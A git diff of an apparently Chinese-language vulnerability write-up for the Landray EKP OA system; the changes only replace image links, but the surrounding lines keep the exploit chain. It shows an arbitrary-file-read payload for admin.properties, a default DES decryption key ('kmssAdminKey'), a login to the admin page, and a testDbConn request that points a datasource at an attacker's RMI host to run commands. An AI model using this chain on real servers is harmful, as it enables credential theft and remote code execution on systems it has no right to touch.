@@ -33,11 +33,11 @@ Accept-Encoding: gzip
 var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}
 ```
 
-![1](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202090125006.png)
+![1](./images/202202090125006.png)
 
 获取password后，使用 DES方法 解密，默认密钥为 **kmssAdminKey**
 
-![2](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202090125061.png)
+![2](./images/202202090125061.png)
 
 访问后台地址使用解密的密码登录
 
@@ -45,7 +45,7 @@ var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}
 http://xxx.xxx.xxx.xxx/admin.do
 ```
 
-![3](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202090126340.png)
+![3](./images/202202090126340.png)
 
 使用工具执行命令
 
@@ -74,4 +74,4 @@ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/w
 method=testDbConn&datasource=rmi://xxx.xxx.xxx.xxx:1099/cbdsdg
 ```
 
-![4](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202090126051.png)
+![4](./images/202202090126051.png)
